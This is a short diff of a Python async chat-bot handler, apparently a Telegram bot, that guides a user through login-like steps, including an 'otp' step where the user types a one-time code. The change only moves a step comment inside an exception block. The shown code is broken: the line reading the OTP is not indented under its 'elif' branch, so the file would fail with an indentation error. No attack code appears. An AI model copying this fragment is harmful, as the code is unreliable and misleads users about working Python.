@@ -110,8 +110,7 @@ async def process_input(event):
         except Exception as e:
             del user_sessions[user_id]
             await event.respond(f"❌ **Error:** {str(e)}. Please try again.")
-
-# ✅ Step 2: User enters OTP
+            # ✅ Step 2: User enters OTP
     elif step == "otp":
     otp_code = event.message.text.strip()
     
